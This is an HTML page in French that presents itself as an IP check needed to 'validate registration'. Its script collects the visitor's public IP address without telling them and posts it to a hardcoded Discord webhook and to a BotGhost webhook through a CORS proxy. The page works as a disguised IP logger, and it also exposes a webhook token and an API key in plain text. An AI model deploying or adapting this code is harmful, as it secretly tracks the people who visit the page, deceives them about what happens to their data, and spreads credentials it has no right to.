<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification d'IP et Inscription</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f4f4f4;
        }
        #container {
            text-align: center;
            padding: 20px;
            border: 1px solid #ddd;
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 300px;
        }
        h1 {
            font-size: 20px;
            color: #333;
        }
        #result {
            margin-top: 15px;
            font-size: 14px;
            color: #555;
        }
        button {
            margin-top: 10px;
            padding: 8px;
            width: 100%;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
    </style>
</head>
<body>
    <div id="container">
        <h1>Vérification de l'IP</h1>
        <button onclick="checkIP()">Vérifier l'IP et valider l'inscription</button>
        <div id="result"></div>
    </div>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1305558117420892241/X3TC44x8aZrxgYD71reZpHIZThzShBhBRhiet7w6K6Uq7oQya9xcGPaPdm3KIC4AZh2K";
        const proxy = "https://cors-anywhere.herokuapp.com/";
        const apiUrl = "https://api.botghost.com/webhook/1151241118403534958/0t2nh2769i3bdja5axve7b";

        function checkIP() {
            // Récupère l'IP de l'utilisateur via l'API ipify
            fetch("https://api.ipify.org?format=json")
                .then(response => response.json())
                .then(data => {
                    const userIP = data.ip;

                    // Prépare le message pour le webhook Discord
                    const message = {
                        content: `Nouvelle vérification : \n**IP**: ${userIP}`
                    };

                    // Envoie les informations au webhook Discord
                    fetch(webhookURL, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify(message)
                    })
                    .then(() => {
                        document.getElementById("result").innerText = "IP vérifiée et inscription validée !";
                    })
                    .catch(error => {
                        console.error("Erreur lors de l'envoi au webhook Discord:", error);
                        document.getElementById("result").innerText = "Erreur lors de la validation.";
                    });

                    // Envoie une requête POST à l'API BotGhost
                    const apiPayload = {
                        variables: [
                            {
                                name: "IP",
                                variable: "{event_message}",
                                value: "${userIP}"
                            }
                        ]
                    };

                    fetch(proxy + apiUrl, {
                        method: "POST",
                        headers: {
                            "Authorization": "bd8f5e61c5b98e12773f211488437e25f753c9139c32103c0bcce6f2bf9223f9",  // Remplacez par votre API_KEY
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify(apiPayload)
                    })
                    .then(response => response.json())
                    .then(data => {
                        console.log("Réponse de BotGhost:", data);
                    })
                    .catch(error => {
                        console.error("Erreur lors de l'envoi à l'API BotGhost:", error);
                    });

                })
                .catch(error => {
                    document.getElementById("result").innerText = "Erreur lors de la récupération de l'IP.";
                    console.error("Erreur:", error);
                });
        }
    </script>
</body>
</html>
